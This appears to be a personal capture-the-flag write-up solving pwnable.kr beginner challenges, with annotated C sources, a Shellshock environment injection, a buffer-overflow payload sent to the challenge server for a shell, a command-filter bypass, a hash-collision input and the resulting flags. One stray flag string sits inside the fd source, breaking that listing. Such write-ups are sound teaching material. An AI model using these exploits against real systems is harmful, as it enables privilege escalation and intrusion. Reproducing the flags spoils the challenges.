# Pwnable
Where Nick tries to hack and constantly fails. No peeking, there be spoilers below!

## Toddler's Bottle

### fd
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	// Convert argv[1] from ascii to int. Subtract hex 0x1234 from it.
	int fd = atoi( argv[1] ) - 0x1234; 
	int len = 0;
	b1NaRy_S34rch1nG_1s_3asy_p3asy

	// Read takes a file descriptor (fd) and reads the file descriptors content
	// into the buf(fer). If fd >2 then we will read from a possible file open
	// on the system, but, we also have some special file descriptors.
	// If fd = 0 we read from STDIN
	// fd = 1 is STDOUT
	// fd = 2 is STDERR
	// So if we want to read LETMEWIN\n into the buffer, we just need to make
	// fd = 0, and then type "LETMEWIN" into the terminal.
	len = read(fd, buf, 32); 
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;
}
```

We can't just pass `0` as the argument, because we subtract `hex 0x1234` from it. So we need to supply `0x1234` as the first argument so that when subtracted it will equal 0.

First, let's find out what `0x1234` is as an int.

```bash
$ python -c "print(int(0x1234))"
4660
```

Great, so now all we should have to do is pass `4660` to the command, and then once it starts to read from STDIN we enter `LETMEWIN\n`.

```bash
$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

### mistake
Something to take note before starting this one is the challenge specifically says no fancy hacking skills required, and that it shouldn't be taken seriously.

Noteably, we get a very nice hint:
> hint : operator priority

So we already know right off the bat that we are probably performing some conditional check incorrectly. 

This particular block looks especially fishy:
```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
	printf("can't open password %d\n", fd);
	return 0;
}
```
So in C the order that this is interpreted is:
1. function calls
2. relational operators (<>)
3. assignment operators(=)

Let's walk through this step by step...
1. We call open(), it could return >2 for a real fd, or a negative number for an error. 
2. We then check if open() < 0.
3. Then we assign that result to fd, which is an int.
4. If fd > 0, we run the conditional block.

What the hell does this all mean? If the password file exists, fd is not the file descriptor, but false! Which as an int equates to 0. A file descriptor of 0 is STDIN, so instead of comparing our password input to the stored password, we compare it to our other input! Ahahahaha!

There's just one final trick - each character of our second password input is XOR'd. 
```c
// xor your input
xor(pw_buf2, 10);
```
So whatever we put in for the second password needs to be the exact opposite of the first password. That's not too difficult, we can just put in 10 `1`'s and 10 `0`'s.

```bash
$ ./mistake
do not bruteforce...
1111111111
0000000000
input password : Password OK
Mommy, the operator priority always confuses me :(
```

### collision

```c
#include <stdio.h>
#include <string.h>
// This doesn't seem very secure...
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
    // Here we take the char pointer and convert it to an array of ints.
    // A char only takes up one byte, while ints take up 4 bytes.
    // The password is 20 characters long, 20/4 = 5.
    // So we are taking 20 characters, converting it to 5 ints, and 
    // summing them.
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i]; // Add each int to res.
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

    // Does res returned by check_password() match the hashcode?
	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

This seems pretty simple conceptually, we just have to concoct some string of 20 characters that adds up to equal the hashcode. What is the hashcode anyways?

```bash
$ python -c "print(int(0x21DD09EC))"
568134124
```

So we just need some password that adds up to `568134124` in the check_password() function.

But.. how the hell do we do that? Let's just start off with some simple math.

```python
col@ubuntu:~$ python
Python 2.7.12 (default, Jul  1 2016, 15:12:24) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x21DD09EC
568134124
>>> 568134124 / 5
113626824
>>> float(568134124) / 5
113626824.8
```

Hmm.. this isn't equally divisible. We'll have to get fancy! Let's see what remainder we have if we multiply by the last number by 4.

```python
>>> 568134124 - (4 * 113626824)
113626828
```

Okay, so we need to do ```(113626824) * 4 + 113626828```

Now how the hell do we encode this as a string of characters? We can use the struct package to convert these int's to a string. But be careful, we need to encode these in little endian format (hence the `<i`)

```python
>>> import struct
>>> (struct.pack('<i', 113626824)*4) + struct.pack('<i', 113626828)
'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06'
```

So we should be able to just pass this to the command and get our flag!

```bash
$ ./col $(python -c "import struct; print((struct.pack('<i', 113626824)*4) + struct.pack('<i', 113626828))")
daddy! I just managed to create a hash collision :)
```

### shellshock

```c
#include <stdio.h>
int main(){
    // Set real, effective, and saved user & group ID
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	
	// Execute bash with -c
	// If the -c option is present, then commands are read from the first 
	// non-option argument command_string.  If there are arguments after the
    // command_string, they are assigned to the positional parameters, 
    // starting with $0.
    // The command being executed is "echo shock_me".
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

So what is shellshock? It's a bash vulnerability from 2014. Quoted from it's [Wikipedia](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) page:
> The first bug causes Bash to unintentionally execute commands when the commands are
> concatenated to the end of function definitions stored in the values of environment 
> variables.

If we look at the [initial CVE reported on the Wikipedia page](https://en.wikipedia.org/wiki/Shellshock_(software_bug)#Initial_report_(CVE-2014-6271)) it gives us this bit of code to see if we're vulnerable.

```bash
env X='() { (a)=>\' bash -c "echo date"; cat echo
```

Lets modify this a little. Instead of doing `env` lets `export` it, and remove the trailing `cat echo`:
```bash
$ export x='() { :;}; echo vulnerable'
```

Now if we run `env` we should see it in the list of variables:
```bash
$ env | grep vuln
x=() { :;}; echo vulnerable
```

If all works as expected, we should see "vulnerable" printed when we run the shellshock binary now:

```bash
$ ./shellshock
vulnerable
shock_me
```

Woohoo! What does this mean for us? Since the program runs priviledged, and the code we injected into the environment variables gets run under this priviledged execution, we should be able to just change `echo vulnerable` to `cat /home/shellshock/flag` and then when we run the shellshock binary it should print out the flag for us. It also looks like the PATH isn't set in this environment, so we have to specify the exact path to `cat`.

```bash
$ export x='() { :;}; /bin/cat /home/shellshock/flag'
$ ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
```

### coin1

> Mommy, I wanna play a game!
> (if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)
>
> Running at : nc pwnable.kr 9007

Okay, let's see what the rules of this game are.

```bash
$ nc pwnable.kr 9007

	---------------------------------------------------
	-              Shall we play a game?              -
	---------------------------------------------------
	
	You have given some gold coins in your hand
	however, there is one counterfeit coin among them
	counterfeit coin looks exactly same as real coin
	however, its weight is different from real one
	real coin weighs 10, counterfeit coin weighes 9
	help me to find the counterfeit coin with a scale
	if you find 100 counterfeit coins, you will get reward :)
	FYI, you have 60 seconds.
	
	- How to play - 
	1. you get a number of coins (N) and number of chances (C)
	2. then you specify a set of index numbers of coins to be weighed
	3. you get the weight information
	4. 2~3 repeats C time, then you give the answer
	
	- Example -
	[Server] N=4 C=2 	# find counterfeit among 4 coins with 2 trial
	[Client] 0 1 		# weigh first and second coin
	[Server] 20			# scale result : 20
	[Client] 3			# weigh fourth coin
	[Server] 10			# scale result : 10
	[Client] 2 			# counterfeit coin is third!
	[Server] Correct!

	- Ready? starting in 3 sec... -
```

This looks like something that would be too difficult to do by hand. I'm not sure if I trust myself to find 100 coins in 60 seconds. Maybe we can automate this with Python?

Using pwntools this is fairly easy. We just connect to the server and do a binary search, checking one group of numbers at a time.

The code can be found in `coin1.py` with more detailed comments. It's also suggested that you ssh into the pwnable servers and run the python code from there, as it's too slow to meet the 60 second deadline otherwise.

```bash
$ python /tmp/coin1_bell.py
[+] Opening connection to localhost on port 9007: Done
N=600  C=10

9

Correct! (0)
...
Correct! (96)

N=500  C=9

Correct! (97)

N=164  C=8

Correct! (98)

N=175  C=8

Correct! (99)

Found all coins, breaking!
Broken!
b1NaRy_S34rch1nG_1s_3asy_p3asy
```

### bof
Something new, instead of being told to **just** connect to a server, we're
given a binary and the source code and most likely have to do some kind of
reverse engineering to solve whatever problem awaits us at the server.

So, let's take a look at the source first.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

So, what we need to do is overflow the 32 character array so that the key no
longer says `0xdeadbeef` but `0xcafebabe` instead. So how the hell do we do that?

First, lets just try running the program and giving it some standard input. We
know the input will have to be at least greater than 32 characters.

Lets view this in GDB while we're running it so we can see what the stack looks
like. First lets disassemble the func function and set a breakpoint right
before our comparison at address `0x56555654`.

```none
(gdb) disas func
Dump of assembler code for function func:
   0x5655562c <+0>:	push   %ebp
   0x5655562d <+1>:	mov    %esp,%ebp
   0x5655562f <+3>:	sub    $0x48,%esp
   0x56555632 <+6>:	mov    %gs:0x14,%eax
   0x56555638 <+12>:	mov    %eax,-0xc(%ebp)
   0x5655563b <+15>:	xor    %eax,%eax
   0x5655563d <+17>:	movl   $0x5655578c,(%esp)
   0x56555644 <+24>:	call   0xf7e45b40 <puts>
   0x56555649 <+29>:	lea    -0x2c(%ebp),%eax
   0x5655564c <+32>:	mov    %eax,(%esp)
   0x5655564f <+35>:	call   0xf7e452b0 <gets>
=> 0x56555654 <+40>:	cmpl   $0xcafebabe,0x8(%ebp)
   0x5655565b <+47>:	jne    0x5655566b <func+63>
   0x5655565d <+49>:	movl   $0x5655579b,(%esp)
   0x56555664 <+56>:	call   0xf7e1b200 <system>
   0x56555669 <+61>:	jmp    0x56555677 <func+75>
   0x5655566b <+63>:	movl   $0x565557a3,(%esp)
   0x56555672 <+70>:	call   0xf7e45b40 <puts>
   0x56555677 <+75>:	mov    -0xc(%ebp),%eax
   0x5655567a <+78>:	xor    %gs:0x14,%eax
   0x56555681 <+85>:	je     0x56555688 <func+92>
   0x56555683 <+87>:	call   0xf7ee7b60 <__stack_chk_fail>
   0x56555688 <+92>:	leave  
   0x56555689 <+93>:	ret    
End of assembler dump.
```

Okay, lets run the program with some standard input and see what it looks like.
```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/bell/pwnable/bof 
overflow me : 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Breakpoint 1, 0x56555654 in func ()
(gdb) x/25x $sp
0xffffd0a0:	0xffffd0bc	0x00000000	0x00000000	0x9e8df500
0xffffd0b0:	0x00000009	0xffffd35d	0xf7e0e4a9	0x41414141
0xffffd0c0:	0x42424242	0x43434343	0x44444444	0x45454545
0xffffd0d0:	0x46464646	0x47474747	0x48484848	0x9e8df500
0xffffd0e0:	0x00000000	0xf7e0e5db	0xffffd108	0x5655569f
0xffffd0f0:	0xdeadbeef	0x00000000	0x565556b9	0x00000000
0xffffd100:	0xf7fb6000
```

We see our input starting at address `0xffffd0bd` with our `A`s in hex (`0x41414141`).
Our input ends at `0xffffd0e0` where we have some null bytes, and then the value
we want to change (`0xdeadbeef`) is a few bytes away. So theoretically we should 
just have to add 13 words of padding (52 characters) and then `0xcafebabe`.

The easiest way to do this is with python. We first print A 52 times for our
padding, then append `0xcafebabe` in hex. Take in mind that this is likely a 
little endien system, so we have to reverse the order of the bytes.

```sh
$ python -c "print 'A'*52 + '\xbe\xba\xfe\xca'"
```

Then, we send this on to the server.

```sh
$ python -c "print 'A'*52 + '\xbe\xba\xfe\xca'" | nc pwnable.kr 9000
ls
cat flag
```

Hmm... it seems were connected and maybe running the commands, but getting no
response back? It appears STDIN is going nowhere, so lets have cat print
out everything going to STDIN.

```sh
$ (python -c "print 'A'*52 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
```

Tada!

### cmd1

```c
$ /bin/cat cmd1.c
#include <stdio.h>
#include <string.h>

// Determines if string contains "flag", "sh", or "tmp".
// If so returns >1, otherwise 0.
int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch"); // Stomps on PATH :(
	if(filter(argv[1])) return 0; // End execution if filter() > 1
	system( argv[1] ); // Execute $1
	return 0;
}
```
 
We can't rely on path, so we have to specify exact path to executables. In this case we want /bin/cat.
We can't use "flag" directly, because it will cause our filter() function to return >1. 
We can use lots of quotes to bypass the filter. Such as: ```"f""l""a""g"```.

```bash
$ ./cmd1 "/bin/cat \"f\"\"l\"\"a\"\"g\""
mommy now I get what PATH environment is for :)
```

### Leg
```c
// leg.c
#include <stdio.h>
#include <fcntl.h>
int key1(){
    // Load pc (program counter) into register 3.
	asm("mov r3, pc\n"); 
}
int key2(){
	asm(
	"push	{r6}\n" // Push register 6 onto stack.
	"add	r6, pc, $1\n" // Add pc to r6
	"bx	r6\n" // Uhh???
	".code   16\n"
	"mov	r3, pc\n"
	"add	r3, $0x4\n"
	"push	{r3}\n"
	"pop	{pc}\n"
	".code	32\n"
	"pop	{r6}\n"
	);
}
int key3(){
	asm("mov r3, lr\n");
}
int main(){
	int key=0;
	printf("Daddy has very strong arm! : ");
	scanf("%d", &key); // Move stdin into key (as int).
	// If all three key functions added together equal key, print flag.
	if( (key1()+key2()+key3()) == key ){ 
		printf("Congratz!\n");
		int fd = open("flag", O_RDONLY);
		char buf[100];
		int r = read(fd, buf, 100);
		write(0, buf, r);
	}
	else{
	    // Otherwise print this.
		printf("I have strong leg :P\n");
	}
	return 0;
}
```
